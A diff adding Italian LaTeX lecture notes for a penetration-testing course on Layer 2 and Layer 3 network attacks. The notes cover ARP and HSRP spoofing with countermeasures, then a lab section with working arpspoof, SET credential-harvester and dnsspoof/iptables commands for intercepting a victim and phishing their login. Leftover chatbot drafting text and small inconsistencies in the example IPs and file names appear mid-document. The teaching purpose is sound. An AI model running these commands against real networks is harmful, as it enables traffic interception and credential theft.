@@ -1,0 +1,1622 @@
+\documentclass[11pt,a4paper]{article}
+
+% --- Packages ---
+\usepackage[margin=.75in]{geometry}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{lmodern} % Fix for font not found error
+\usepackage{titlesec}
+\usepackage{enumitem}
+\usepackage{hyperref}
+\usepackage{xcolor}
+\usepackage{fancyhdr}
+\usepackage{comment}
+\usepackage{cleveref}
+\usepackage[bottom]{footmisc}
+\usepackage{graphicx}
+\usepackage{longtable}
+\usepackage{booktabs}
+\usepackage{array}
+\usepackage{calc}
+\usepackage{etoolbox}
+
+% Standard Pandoc setup
+\providecommand{\tightlist}{%
+  \setlength{\itemsep}{0pt}\setlength{\parskip}{0pt}}
+
+\crefformat{section}{\S#2#1#3}
+\crefformat{subsection}{\S#2#1#3}
+\crefformat{subsubsection}{\S#2#1#3}
+\crefformat{figure}{#2Figure~#1#3}
+\crefformat{footnote}{#2\footnotemark[#1]#3}
+
+\linespread{0.9} % Riduce lo spazio tra le linee
+
+% --- Colors ---
+\definecolor{primary}{RGB}{0, 0, 0}
+\definecolor{links}{HTML}{0000EE}
+\definecolor{blue}{HTML}{26428B}
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=links,
+    urlcolor=links,
+    citecolor=links,
+}
+
+% --- Section Formatting ---
+\titleformat{\section}
+  {\normalfont\Large\bfseries\color{blue}}{\thesection}{1em}{}
+\titleformat{\subsection}
+{\normalfont\large\bfseries\color{blue}}{\thesubsection}{1em}{}
+\titleformat{\subsubsection}
+{\normalfont\bfseries\color{blue}}{\thesubsubsection}{1em}{}
+
+% --- Header and Footer ---
+\pagestyle{fancy}
+\fancyhead[L]{\small Giuseppe Capasso}
+\fancyhead[R]{\small vapt}
+\fancyfoot[C]{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+
+% --- Custom Title Command ---
+\newcommand{\proposaltitle}[1]{
+    \begin{center}
+        \vspace*{0.1cm}
+        {\LARGE \bfseries \color{blue} #1} \\[1.5ex]
+        {\large \textbf{Giuseppe Capasso}} \\[1ex]
+                \small{
+            \vspace{0.1cm}
+            \textbf{Materia:} vapt\\
+        }
+            \end{center}
+    \vspace{0.3cm}
+    \hrule height 0.5pt
+    \vspace{0.5cm}
+}
+
+\begin{document}
+
+\proposaltitle{Introduzione}
+
+\section{Introduzione}\label{introduzione}
+
+In questa lezione, ci focalizzeremo sugli attacchi destinati
+all'infrastruttura di rete. In particolare, copriremo attacchi alle LAN
+e ai principali protocolli di livello 3 dello stack TCP/IP.
+
+\section{Fondamenti di Rete}\label{fondamenti-di-rete}
+
+Per comprendere come un\textquotesingle infrastruttura possa essere
+compromessa, è indispensabile padroneggiare il suo funzionamento in
+condizioni di normalità. In questo capitolo ripasseremo i concetti
+architetturali alla base delle comunicazioni locali e geografiche,
+focalizzandoci sui protocolli e sui meccanismi che governano il Data
+Link Layer e il Network Layer del modello OSI.
+
+\subsubsection{Identità in Rete: Indirizzamento Fisico e
+Logico}\label{identituxe0-in-rete-indirizzamento-fisico-e-logico}
+
+La comunicazione di rete si basa su un sistema di doppio indirizzamento,
+necessario per gestire sia la consegna locale
+(all\textquotesingle interno dello stesso segmento) sia
+l\textquotesingle instradamento globale (attraverso reti diverse).
+
+\begin{itemize}
+\item
+  \textbf{MAC Address (Media Access Control):
+  L\textquotesingle Indirizzo Fisico (Layer 2)}
+
+  \begin{itemize}
+  \item
+    È un identificatore univoco a 48 bit, tipicamente espresso in
+    formato esadecimale (es. 00:1A:2B:3C:4D:5E).
+  \item
+    È "bruciato" (burned-in) nella scheda di rete (NIC) dal produttore e
+    opera esclusivamente a livello di rete locale (LAN).
+  \item
+    I primi 24 bit rappresentano l\textquotesingle OUI (Organizationally
+    Unique Identifier), che identifica il vendor, mentre i restanti 24
+    bit sono assegnati specificamente a quella singola interfaccia.
+  \end{itemize}
+\item
+  \textbf{IP Address (Internet Protocol): L\textquotesingle Indirizzo
+  Logico (Layer 3)}
+
+  \begin{itemize}
+  \item
+    Nel caso dell\textquotesingle IPv4, è un indirizzo gerarchico a 32
+    bit, diviso in quattro ottetti decimali (es. 192.168.1.10).
+  \item
+    A differenza del MAC, l\textquotesingle IP non è legato
+    all\textquotesingle hardware ma è assegnato logicamente
+    (staticamente o dinamicamente via DHCP) e definisce sia la rete di
+    appartenenza (Network ID) sia lo specifico host (Host ID).
+  \item
+    È essenziale per il routing: permette ai router di inoltrare i
+    pacchetti tra reti geograficamente o logicamente separate.
+  \end{itemize}
+\end{itemize}
+
+\subsubsection{La Meccanica dello
+Switch}\label{la-meccanica-dello-switch}
+
+Lo switch è il cuore nevralgico della LAN moderna. A differenza del
+vecchio hub, che replicava ogni segnale elettrico su tutte le porte
+(causando collisioni e inefficienze), lo switch è un apparato
+intelligente che inoltra i frame Layer 2 in modo selettivo.
+
+Il suo funzionamento si basa sulla \textbf{MAC Address Table} (o CAM
+Table):
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Apprendimento (Learning):} Quando uno switch riceve un frame,
+  legge il MAC address \emph{sorgente} e lo associa alla porta fisica da
+  cui è entrato, salvando questa informazione nella sua tabella.
+\item
+  \textbf{Inoltro (Forwarding):} Lo switch consulta poi il MAC address
+  \emph{destinazione} del frame. Se questo indirizzo è presente nella
+  sua tabella, inoltra il frame esclusivamente alla porta associata.
+\item
+  \textbf{Flooding:} Se il MAC destinazione non è presente nella tabella
+  (Unknown Unicast), oppure se si tratta di un indirizzo di Broadcast
+  (es. FF:FF:FF:FF:FF:FF), lo switch inoltra il frame su tutte le porte
+  attive, ad eccezione di quella da cui lo ha ricevuto.
+\end{enumerate}
+
+\subsubsection{Il Protocollo ARP: Il Ponte tra Logico e
+Fisico}\label{il-protocollo-arp-il-ponte-tra-logico-e-fisico}
+
+Affinché un host A possa inviare un pacchetto IP a un host B sulla
+stessa rete locale, deve prima incapsulare il pacchetto in un frame
+Ethernet. Per farlo, ha bisogno di conoscere il MAC address di B. Qui
+entra in gioco l\textquotesingle{}\textbf{ARP (Address Resolution
+Protocol)}.
+
+Il processo di risoluzione avviene in due fasi:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{ARP Request:} L\textquotesingle host A invia un messaggio in
+  broadcast (FF:FF:FF:FF:FF:FF) a tutta la sottorete chiedendo:
+  \emph{"Chi ha l\textquotesingle indirizzo IP 192.168.1.50? Risponda
+  indicando il proprio MAC address"}.
+\item
+  \textbf{ARP Reply:} L\textquotesingle host B (e solo lui) riconosce il
+  proprio IP, genera una risposta unicast diretta
+  all\textquotesingle host A comunicando il proprio MAC address.
+\end{enumerate}
+
+Una volta ricevuta la risposta, l\textquotesingle host A salva
+l\textquotesingle associazione IP-MAC nella propria \textbf{ARP Cache}
+locale, in modo da non dover ripetere la richiesta per le comunicazioni
+successive a breve termine.
+
+\subsubsection{La Vulnerabilità di
+ARP}\label{la-vulnerabilituxe0-di-arp}
+
+Se dal punto di vista operativo l\textquotesingle ARP è un capolavoro di
+efficienza, dal punto di vista della sicurezza è un protocollo
+intrinsecamente vulnerabile. È stato progettato con
+un\textquotesingle architettura \textbf{stateless} (senza memoria di
+stato) e si basa sul principio della totale "fiducia implicita"
+(implicit trust).
+
+Le due debolezze architetturali fondamentali che un Penetration Tester
+sfrutta sono:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Mancanza di Autenticazione:} Non esiste alcun meccanismo
+  crittografico per verificare che l\textquotesingle host che invia un
+  messaggio ARP sia effettivamente il legittimo proprietario di
+  quell\textquotesingle indirizzo IP.
+\item
+  \textbf{Accettazione Acritica:} Un host aggiornerà la propria cache
+  ARP anche se riceve una \emph{ARP Reply} non sollecitata (ovvero,
+  senza aver mai inviato una precedente \emph{ARP Request}).
+\end{enumerate}
+
+Questa dinamica viene spesso innescata abusando dei \textbf{Gratuitous
+ARP}, ovvero messaggi di broadcast legittimi usati tipicamente dagli
+apparati di rete per annunciare un cambio di indirizzo MAC (es. in
+scenari di failover come l\textquotesingle HSRP) o per rilevare
+conflitti IP.
+
+\subsubsection{ARP Spoofing (o ARP Poisoning):
+L\textquotesingle Attacco}\label{arp-spoofing-o-arp-poisoning-lattacco}
+
+L\textquotesingle attacco di \textbf{ARP Spoofing} consiste
+nell\textquotesingle inviare pacchetti ARP forgiati (falsificati) sulla
+rete locale per "avvelenare" (poisoning) la cache ARP degli host target.
+
+\textbf{La dinamica dell\textquotesingle attacco:}
+L\textquotesingle attaccante vuole intercettare il traffico tra una
+Vittima (es. 192.168.1.50) e il Default Gateway (es. 192.168.1.1).
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  L\textquotesingle attaccante invia una \emph{ARP Reply} falsificata
+  alla Vittima dichiarando: \emph{"Il MAC address
+  dell\textquotesingle IP 192.168.1.1 (Gateway) è il mio MAC address"}.
+\item
+  Parallelamente, l\textquotesingle attaccante invia una \emph{ARP
+  Reply} falsificata al Gateway dichiarando: \emph{"Il MAC address
+  dell\textquotesingle IP 192.168.1.50 (Vittima) è il mio MAC address"}.
+\end{enumerate}
+
+\textbf{Gli impatti principali:}
+
+\begin{itemize}
+\item
+  \textbf{Man-in-the-Middle (MitM):} Tutto il traffico in uscita dalla
+  vittima e diretto verso internet passerà prima attraverso la macchina
+  dell\textquotesingle attaccante (che agirà da router invisibile
+  facendo IP forwarding). Questo permette lo \emph{sniffing} di
+  credenziali in chiaro, il dirottamento di sessioni e la manipolazione
+  dei pacchetti in transito.
+\item
+  \textbf{Denial of Service (DoS):} Se l\textquotesingle attaccante
+  associa l\textquotesingle IP del gateway a un MAC address inesistente
+  (o semplicemente non inoltra i pacchetti intercettati), la vittima
+  subisce un \emph{blackholing} del traffico, perdendo totalmente la
+  connettività esterna.
+\end{itemize}
+
+\subsubsection{Contromisure e Mitigazioni
+Architetturali}\label{contromisure-e-mitigazioni-architetturali}
+
+In un ambiente enterprise o durante un\textquotesingle attività di
+remediation post-VA/PT, la sicurezza del Layer 2 non può essere affidata
+al caso. Le difese si dividono in operative e infrastrutturali:
+
+\begin{itemize}
+\item
+  \textbf{Tabelle ARP Statiche (Mitigazione Operativa):} Consiste nel
+  forzare manualmente l\textquotesingle associazione IP-MAC nei sistemi
+  operativi degli host critici o sul router (arp -s su Windows/Linux). È
+  una soluzione invulnerabile allo spoofing, ma assolutamente
+  \textbf{non scalabile} e inadatta a reti dinamiche con client DHCP.
+  Viene usata solo in casi limite (es. tra due server ad altissima
+  criticità).
+\item
+  \textbf{Dynamic ARP Inspection - DAI (Mitigazione Infrastrutturale):}
+  È lo standard de facto per la difesa a livello enterprise. Il DAI è
+  una feature di sicurezza configurabile sugli switch (come i Cisco
+  Catalyst o la serie 8000v) che intercetta tutti i pacchetti ARP in
+  transito sulle porte non fidate (untrusted).
+
+  \begin{itemize}
+  \item
+    \textbf{Come funziona:} Lo switch analizza ogni pacchetto ARP e lo
+    scarta se rileva che il MAC address e l\textquotesingle IP address
+    non corrispondono a un\textquotesingle associazione legittima.
+  \item
+    \textbf{Da dove prende le informazioni valide?} Il DAI lavora in
+    tandem con il \textbf{DHCP Snooping Binding Database}, una tabella
+    costruita dallo switch osservando le normali transazioni DHCP. Se un
+    host ha regolarmente ottenuto un IP dal server DHCP, lo switch sa
+    esattamente quale MAC address è autorizzato a usare
+    quell\textquotesingle IP. Se arriva un pacchetto ARP anomalo, viene
+    bloccato, l\textquotesingle evento viene loggato e la porta può
+    essere messa in stato di \emph{err-disable}.
+  \end{itemize}
+\end{itemize}
+
+\subsubsection{Il Sistema DNS: La Risoluzione dei
+Nomi}\label{il-sistema-dns-la-risoluzione-dei-nomi}
+
+Mentre macchine e router ragionano per indirizzi IP e MAC, gli esseri
+umani utilizzano nomi mnemonici (es. www.azienda.local). Il
+\textbf{Domain Name System (DNS)} è l\textquotesingle infrastruttura
+globale e gerarchica (Layer 7) che si occupa di questa traduzione.
+
+\begin{itemize}
+\item
+  \textbf{Funzionamento:} Quando un client deve raggiungere un dominio,
+  il suo resolver locale invia una query (tipicamente UDP sulla porta
+  53) al server DNS configurato (spesso fornito dal DHCP).
+\item
+  \textbf{Risoluzione:} Se il server DNS locale possiede
+  l\textquotesingle informazione nella sua cache o nella sua zona
+  autoritativa, risponde immediatamente con l\textquotesingle indirizzo
+  IP corrispondente. Altrimenti, interroga ricorsivamente altri server
+  DNS (Root servers, TLD servers, Authoritative servers) fino a ottenere
+  la risposta da inoltrare al client.
+\item
+  Il corretto funzionamento del DNS è vitale: senza di esso, sebbene la
+  connettività di base (Layer 3) sia intatta, la navigazione e
+  l\textquotesingle accesso ai servizi risultano di fatto impossibili
+  per un utente standard.
+\end{itemize}
+
+\subsubsection{Ripasso Teorico: Il Protocollo
+DHCP}\label{ripasso-teorico-il-protocollo-dhcp}
+
+Il \textbf{Dynamic Host Configuration Protocol (DHCP)} è un protocollo
+di tipo client-server che automatizza l\textquotesingle assegnazione
+degli indirizzi IP e di altri parametri di rete critici. Senza DHCP,
+ogni dispositivo dovrebbe essere configurato manualmente (Static IP),
+rendendo la gestione di reti moderne virtualmente impossibile.
+
+\paragraph{Funzionamento e Porte}\label{funzionamento-e-porte}
+
+Il DHCP opera a livello applicativo (Layer 7) ma interagisce
+direttamente con i livelli inferiori per la consegna dei pacchetti
+quando l\textquotesingle host non ha ancora un\textquotesingle identità
+logica.
+
+\begin{itemize}
+\item
+  \textbf{Protocollo di Trasporto:} UDP.
+\item
+  \textbf{Porta Server:} 67 (ascolta le richieste dei client).
+\item
+  \textbf{Porta Client:} 68 (riceve le risposte dal server).
+\end{itemize}
+
+\paragraph{Il Processo DORA}\label{il-processo-dora}
+
+La transazione standard tra un client e un server DHCP avviene in
+quattro fasi principali, riassunte dall\textquotesingle acronimo
+\textbf{DORA}:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{D}iscover (Client -\textgreater{} Server):
+  L\textquotesingle host appena connesso invia un pacchetto in broadcast
+  (255.255.255.255) per individuare i server DHCP disponibili nella rete
+  locale.
+\item
+  \textbf{O}ffer (Server -\textgreater{} Client): Uno o più server
+  rispondono proponendo una configurazione (IP, Subnet, Gateway). A
+  questo livello, l\textquotesingle IP non è ancora assegnato, è solo
+  "prenotato".
+\item
+  \textbf{R}equest (Client -\textgreater{} Server): Il client accetta
+  formalmente una delle offerte ricevute (solitamente la prima) inviando
+  un altro broadcast. Questo serve anche a informare gli altri eventuali
+  server DHCP che la loro offerta non è stata scelta.
+\item
+  \textbf{A}cknowledge (Server -\textgreater{} Client): Il server
+  conferma l\textquotesingle assegnazione e invia i dettagli finali. Da
+  questo momento l\textquotesingle host è ufficialmente configurato.
+\end{enumerate}
+
+\paragraph{Il Concetto di Lease
+(Locazione)}\label{il-concetto-di-lease-locazione}
+
+L\textquotesingle indirizzo IP non viene regalato al client, ma
+"affittato" per un tempo determinato, chiamato \textbf{Lease Time}.
+
+\begin{itemize}
+\item
+  \textbf{T1 (Renewal):} Al 50\% della durata del lease, il client tenta
+  di rinnovarlo contattando il server in unicast.
+\item
+  \textbf{T2 (Rebinding):} Se il server non risponde,
+  all\textquotesingle87.5\% della durata il client invia un broadcast
+  per cercare \emph{qualsiasi} server DHCP che possa estendere il lease.
+\item
+  \textbf{Expiration:} Se il tempo scade senza rinnovo,
+  l\textquotesingle host perde l\textquotesingle IP e deve ricominciare
+  il processo dal Discover.
+\end{itemize}
+
+\paragraph{DHCP Relay Agent}\label{dhcp-relay-agent}
+
+In reti enterprise segmentate, il server DHCP spesso non risiede nella
+stessa VLAN dei client. Poiché i broadcast non superano i router, si
+utilizza il \textbf{DHCP Relay} (comando Cisco ip helper-address). Il
+router riceve il broadcast del client, lo trasforma in un pacchetto
+unicast e lo instrada verso l\textquotesingle IP del server DHCP remoto.
+
+\begin{itemize}
+\tightlist
+\item
+  \emph{Nota per il VA/PT:} Il Relay Agent aggiunge informazioni al
+  pacchetto (come l\textquotesingle indirizzo
+  dell\textquotesingle interfaccia sorgente), permettendo al server di
+  capire da quale pool deve pescare l\textquotesingle IP.
+\end{itemize}
+
+\subsubsection{First Hop Redundancy}\label{first-hop-redundancy}
+
+In un\textquotesingle infrastruttura di rete tradizionale, il Default
+Gateway rappresenta un critico \emph{single point of failure} (punto
+singolo di guasto). Se l\textquotesingle interfaccia del router che
+funge da gateway si disconnette o subisce un disservizio,
+l\textquotesingle intero segmento di rete locale perde la capacità di
+comunicare con l\textquotesingle esterno, indipendentemente dalla
+stabilità del resto dell\textquotesingle infrastruttura.
+
+Per mitigare questo rischio ingegneristico sono stati sviluppati i
+protocolli della famiglia FHRP (First Hop Redundancy Protocol). Tra
+questi, l\textquotesingle{}\textbf{HSRP (Hot Standby Router Protocol)} è
+lo standard proprietario Cisco più diffuso. L\textquotesingle obiettivo
+dell\textquotesingle HSRP è garantire un failover trasparente e
+immediato, raggruppando più router fisici all\textquotesingle interno di
+un unico cluster logico.
+
+\subsubsection{Architettura e Funzionamento
+dell\textquotesingle HSRP}\label{architettura-e-funzionamento-dellhsrp}
+
+In una topologia HSRP, due o più router collaborano per presentarsi agli
+host della LAN come un singolo "Virtual Router". Questo apparato
+virtuale è definito da due elementi fondamentali:
+
+\begin{itemize}
+\item
+  \textbf{Virtual IP (VIP):} Un indirizzo IP logico condiviso tra i
+  router del gruppo. Questo è l\textquotesingle indirizzo che viene
+  configurato come default gateway sui client (staticamente o tramite
+  DHCP).
+\item
+  \textbf{Virtual MAC Address:} Un indirizzo fisico generato
+  algoritmicamente e associato al VIP. Nelle implementazioni classiche
+  (HSRPv1), ha il formato 0000.0c07.acXX, dove gli ultimi due caratteri
+  esadecimali rappresentano l\textquotesingle ID del gruppo HSRP.
+\end{itemize}
+
+\textbf{Il Processo Elettivo:} Affinché non ci siano conflitti di
+instradamento, i router del gruppo eleggono un \textbf{Active Router},
+che si assume l\textquotesingle onere esclusivo di inoltrare il traffico
+destinato al Virtual MAC, e uno \textbf{Standby Router}, che rimane in
+ascolto pronto a subentrare in caso di guasto.
+
+L\textquotesingle elezione si basa su un valore di \textbf{Priority} (da
+0 a 255, con 100 come valore di default). Il router con la priorità più
+alta vince. Per mantenere l\textquotesingle accordo sullo stato del
+cluster, i router si scambiano periodicamente pacchetti di \emph{Hello}
+in multicast (all\textquotesingle indirizzo 224.0.0.2 su porta UDP
+1985). Se lo Standby Router smette di ricevere i pacchetti Hello
+dall\textquotesingle Active Router per un tempo superiore
+all\textquotesingle{}\emph{Hold Time} (di default 10 secondi), dichiara
+il leader caduto e assume immediatamente il ruolo attivo.
+
+\subsubsection{Vulnerabilità HSRP: Il Takeover del
+Gateway}\label{vulnerabilituxe0-hsrp-il-takeover-del-gateway}
+
+Esattamente come per l\textquotesingle ARP, l\textquotesingle HSRP
+nativo è stato concepito in un\textquotesingle era di totale fiducia
+infrastrutturale. Nelle sue configurazioni di base,
+l\textquotesingle HSRP è privo di autenticazione o utilizza, al massimo,
+una debole autenticazione in chiaro (spesso lasciata sul default
+"cisco").
+
+Questa debolezza espone la rete a un attacco critico di \textbf{HSRP
+Takeover}. Un Penetration Tester (o un attaccante) posizionato nello
+stesso dominio di broadcast può sfruttare le dinamiche del protocollo
+per diventare lui stesso il Default Gateway della rete.
+
+\textbf{La dinamica dell\textquotesingle attacco:}
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Reconnaissance:} L\textquotesingle attaccante si mette in
+  ascolto passivo sulla rete catturando i pacchetti multicast 224.0.0.2.
+  Ispezionando gli \emph{Hello} packet dell\textquotesingle HSRP,
+  estrapola il Virtual IP, l\textquotesingle ID del gruppo,
+  l\textquotesingle indirizzo IP del router attivo, la sua priorità e
+  l\textquotesingle eventuale password in chiaro.
+\item
+  \textbf{Injection (Takeover):} Utilizzando tool di network injection
+  (come \emph{Yersinia} o script Scapy personalizzati),
+  l\textquotesingle attaccante inizia a trasmettere messaggi di
+  \emph{Hello} contraffatti sulla rete, dichiarando di appartenere allo
+  stesso gruppo HSRP, conoscendo la password corretta, ma impostando una
+  \textbf{Priority massima (255)}.
+\item
+  \textbf{Preemption:} Se sui router legittimi è abilitata la funzione
+  di \emph{Preemption} (una feature che permette a un router con
+  priorità superiore di spodestare immediatamente il leader attuale
+  senza aspettare che cada), la macchina dell\textquotesingle attaccante
+  viene eletta istantaneamente nuovo Active Router.
+\end{enumerate}
+
+\textbf{Gli impatti principali:} A questo punto, tutti i client della
+rete invieranno il loro traffico in uscita alla macchina
+dell\textquotesingle attaccante. Questo scenario permette un attacco
+Man-in-the-Middle perfetto su scala di rete, consentendo
+l\textquotesingle intercettazione, l\textquotesingle alterazione o il
+blocco (DoS) del traffico verso internet o verso altre VLAN.
+
+\subsubsection{Contromisure: Blindare la
+Ridondanza}\label{contromisure-blindare-la-ridondanza}
+
+La mitigazione degli attacchi contro i protocolli di routing e
+ridondanza richiede di eliminare la "fiducia cieca" e imporre una
+validazione rigorosa dei messaggi.
+
+\begin{itemize}
+\item
+  \textbf{Autenticazione Crittografica:} La soluzione definitiva è
+  abbandonare l\textquotesingle autenticazione in chiaro (o la sua
+  assenza) e configurare l\textquotesingle autenticazione basata su
+  \textbf{MD5} (o algoritmi superiori se supportati) per il gruppo HSRP.
+  In questo modo, ogni pacchetto \emph{Hello} include un hash
+  crittografico basato su una chiave segreta condivisa tra i soli router
+  legittimi. Eventuali pacchetti iniettati da un attaccante verranno
+  immediatamente scartati dal cluster, poiché
+  l\textquotesingle attaccante non possiede la chiave per generare
+  l\textquotesingle hash corretto.
+\item
+  \textbf{Filtri Multicast e ACL:} Aggiungere Access Control List sulle
+  interfacce di switch e router per limitare quali porte fisiche possono
+  originare traffico multicast destinato all\textquotesingle indirizzo
+  224.0.0.2
+\end{itemize}
+
+Ottima scelta strategica. Lavorare a coppie sui Cisco 2960 fisici con le
+VM in bridge abbatte il carico computazionale e simula un environment
+"bare metal" molto più realistico rispetto alle reti virtuali chiuse.
+
+Per mantenere la continuità con la stesura precedente, nominerò questa
+sezione "Capitolo 3", dato che il Capitolo 2 lo abbiamo dedicato alla
+teoria e agli attacchi HSRP.
+
+Ecco la dispensa per il laboratorio.
+
+\section{Laboratorio Pratico - ARP Spoofing, Phishing e Mitigazioni
+Layer
+2}\label{laboratorio-pratico---arp-spoofing-phishing-e-mitigazioni-layer-2}
+
+Questo laboratorio trasforma i concetti teorici di vulnerabilità del
+Layer 2 in un attacco reale. Lavorerete in coppie: uno studente assumerà
+il ruolo dell\textquotesingle attaccante (Red Team),
+l\textquotesingle altro quello della vittima. Successivamente,
+consoliderete l\textquotesingle infrastruttura implementando le
+contromisure sugli switch Cisco 2960.
+
+\subsubsection{Setup dell\textquotesingle Ambiente: VirtualBox in
+"Bridged Mode"}\label{setup-dellambiente-virtualbox-in-bridged-mode}
+
+Di default, VirtualBox configura le interfacce di rete in modalità NAT,
+creando una rete isolata dove la VM esce su internet "dietro"
+l\textquotesingle host fisico. Per gli attacchi Layer 2 (come
+l\textquotesingle ARP Spoofing), l\textquotesingle attaccante deve
+risiedere nello \textbf{stesso dominio di broadcast} della vittima. È
+quindi necessario "ponticellare" la scheda di rete virtuale di Kali con
+quella fisica del vostro PC, connessa allo switch Cisco.
+
+\textbf{Procedura su VirtualBox:}
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  Spegnete la macchina virtuale Kali Linux.
+\item
+  Aprite le \textbf{Impostazioni} della VM e andate nella sezione
+  \textbf{Rete}.
+\item
+  Alla voce \textbf{Connesso a}, selezionate dal menu a tendina
+  \textbf{Scheda con bridge} (Bridged Adapter).
+\item
+  Alla voce \textbf{Nome}, selezionate la scheda di rete Ethernet fisica
+  del vostro host (quella fisicamente cablata allo switch 2960).
+\item
+  Espandete la sezione \textbf{Avanzate} e, alla voce \textbf{Modalità
+  promiscua}, selezionate \textbf{Permetti a tutte} (Allow All). Questo
+  è cruciale per permettere alla scheda di catturare il traffico non
+  destinato direttamente al suo MAC address durante lo sniffing.
+\item
+  Avviate Kali e verificate di aver ottenuto un IP dalla rete del
+  laboratorio (ip a).
+\end{enumerate}
+
+\subsubsection{Fase di Attacco: Man-in-the-Middle e Credential
+Harvesting}\label{fase-di-attacco-man-in-the-middle-e-credential-harvesting}
+
+In questa fase, l\textquotesingle attaccante intercetterà il traffico
+della vittima e clonerà una pagina di login per sottrarre le
+credenziali.
+
+\paragraph{Step 1: Abilitare l\textquotesingle IP
+Forwarding}\label{step-1-abilitare-lip-forwarding}
+
+Prima di "avvelenare" la rete, l\textquotesingle attaccante deve
+istruire il proprio kernel Linux a instradare i pacchetti. Se non lo si
+fa, il traffico della vittima verrebbe droppato dalla macchina
+dell\textquotesingle attaccante, causando un Denial of Service (la
+vittima non navigherebbe più) e rivelando l\textquotesingle attacco.
+
+Da terminale su Kali (come root):
+
+Bash
+
+echo 1 \textgreater{} /proc/sys/net/ipv4/ip\_forward
+
+\paragraph{Step 2: Esecuzione dell\textquotesingle ARP
+Spoofing}\label{step-2-esecuzione-dellarp-spoofing}
+
+Utilizzeremo la suite dsniff. Assumiamo che:
+
+\begin{itemize}
+\item
+  eth0 = interfaccia di Kali
+\item
+  192.168.1.50 = IP della Vittima
+\item
+  192.168.1.254 = IP del Default Gateway
+\end{itemize}
+
+L\textquotesingle attaccante deve aprire due finestre di terminale per
+ingannare entrambe le direzioni:
+
+\textbf{Terminale 1 (Inganna la Vittima):}
+
+Bash
+
+arpspoof -i eth0 -t 192.168.1.50 192.168.1.254
+
+\textbf{Terminale 2 (Inganna il Gateway):}
+
+Bash
+
+arpspoof -i eth0 -t 192.168.1.254 192.168.1.50
+
+Ora tutto il traffico tra la vittima e il gateway passa fisicamente
+attraverso l\textquotesingle interfaccia
+dell\textquotesingle attaccante.
+
+\paragraph{Step 3: Clonazione del portale con SE Toolkit
+(SET)}\label{step-3-clonazione-del-portale-con-se-toolkit-set}
+
+Sfrutteremo il Social-Engineer Toolkit per clonare la pagina di login di
+Twitter e catturare le credenziali immesse dalla vittima.
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  Avviate il tool da terminale: setoolkit
+\item
+  Navigate il menu interattivo:
+
+  \begin{itemize}
+  \item
+    Selezionate 1 (Social-Engineering Attacks)
+  \item
+    Selezionate 2 (Website Attack Vectors)
+  \item
+    Selezionate 3 (Credential Harvester Attack Method)
+  \item
+    Selezionate 2 (Site Cloner)
+  \end{itemize}
+\item
+  \textbf{IP address for the POST back:} Inserite l\textquotesingle IP
+  della vostra macchina Kali.
+\item
+  \textbf{Enter the url to clone:} Inserite http://twitter.com (o la
+  pagina di login esatta).
+\end{enumerate}
+
+\emph{Nota Tecnica: Nel web moderno, domini come Twitter implementano
+HSTS (HTTP Strict Transport Security), che forza la crittografia HTTPS e
+rende i browser restii ad accettare certificati non validi o connessioni
+declassate. Ai fini del laboratorio, se la vittima naviga direttamente
+sull\textquotesingle IP dell\textquotesingle attaccante (o tramite una
+regola di DNS Spoofing associata per un dominio http-only), vedrà la
+pagina clonata e i log di SET registreranno la password in chiaro non
+appena la vittima tenterà il login.}
+
+L\textquotesingle ARP Spoofing ci permette di ricevere i pacchetti della
+vittima, ma il \textbf{DNS Spoofing} ci permette di decidere dove la
+vittima debba andare quando digita un URL (es. www.google.it). In questo
+scenario, noi agiremo come un server DNS malevolo che fornisce risposte
+falsificate.
+
+\paragraph{1. Preparazione dell\textquotesingle Attaccante
+(Kali)}\label{preparazione-dellattaccante-kali}
+
+Per prima cosa, dobbiamo assicurarci che le richieste DNS della vittima
+non raggiungano mai il server DNS legittimo (come quello di Google
+8.8.8.8). Usiamo \textbf{IPtables} per intercettare e bloccare il
+traffico DNS (porta 53 UDP) che la vittima tenta di inoltrare:
+
+Bash
+
+\# Blocca il traffico DNS in uscita dalla vittima che stiamo inoltrando
+
+sudo iptables -A FORWARD -p udp -\/-dport 53 -j DROP
+
+Successivamente, creiamo un file di configurazione (spesso chiamato
+hosts.txt) che indichi al nostro tool di spoofing (come dnschef o
+ettercap) quale dominio dirottare verso il nostro IP:
+
+\begin{quote}
+\textbf{Esempio file hosts.txt:} \textless ip-attaccante\textgreater{}
+www.target-domain.com 10.10.10.11
+\href{http://www.google.it/}{www.google.it}
+\end{quote}
+
+\paragraph{\texorpdfstring{\textbf{2. Esecuzione
+dell\textquotesingle Attacco}}{2. Esecuzione dell\textquotesingle Attacco}}\label{esecuzione-dellattacco}
+
+Lanciamo dnsspoof indicando l\textquotesingle interfaccia di rete e il
+file dei nomi creato:
+
+Bash
+
+sudo dnsspoof -i eth0 -f fake\_hosts.txt
+
+\paragraph{3. Verifica Lato Vittima
+(Windows/Linux)}\label{verifica-lato-vittima-windowslinux}
+
+Per testare se l\textquotesingle attacco sta funzionando, dobbiamo agire
+sulla macchina vittima. È fondamentale svuotare la cache DNS locale,
+altrimenti il computer userà l\textquotesingle indirizzo IP corretto
+salvato in precedenza senza chiedere al server (noi).
+
+Su \textbf{Windows}, apri il prompt dei comandi e digita:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Svuota la cache:} ipconfig /flushdns
+\item
+  \textbf{Interroga il dominio:} nslookup www.google.it
+\end{enumerate}
+
+\textbf{Risultato atteso:} Se l\textquotesingle attacco ha successo, il
+comando nslookup restituirà l\textquotesingle indirizzo IP della
+macchina Kali dell\textquotesingle attaccante invece
+dell\textquotesingle IP reale di Google. Da questo momento, ogni
+tentativo di navigazione verso quel dominio porterà la vittima su un
+server web controllato dall\textquotesingle attaccante (es. una pagina
+di phishing).
+
+\subsubsection{Approfondimento: HTTPS e HSTS (Le difese
